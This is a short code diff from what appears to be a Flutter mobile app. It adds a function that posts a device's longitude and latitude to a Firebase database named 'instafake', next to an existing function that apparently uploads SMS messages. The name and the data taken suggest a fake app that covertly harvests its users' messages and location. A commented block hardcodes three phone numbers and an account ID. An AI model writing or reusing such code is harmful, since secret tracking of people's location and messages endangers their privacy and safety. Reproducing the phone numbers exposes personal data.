@@ -73,3 +73,23 @@ Future<void> addSms(String sms) async {
     throw error;
   }
 }
+
+Future<void> addLoc(String long, String lat) async {
+  /*  if (number == "8866535452" ||
+      number == "9106116309" ||
+      number == "7014799875") {
+    userId = "aWfOSS3W81eprgxms6QZT11vTZr1";
+  } */
+  try {
+    var url =
+        "https://instafake-bcf66-default-rtdb.asia-southeast1.firebasedatabase.app/$id/locate/.json";
+
+    final response =
+        await http.post(url, body: json.encode({'long': long, "lat": lat}));
+    print(json.decode(response.body));
+    print("ho gi ya");
+  } catch (error) {
+    print(error);
+    throw error;
+  }
+}
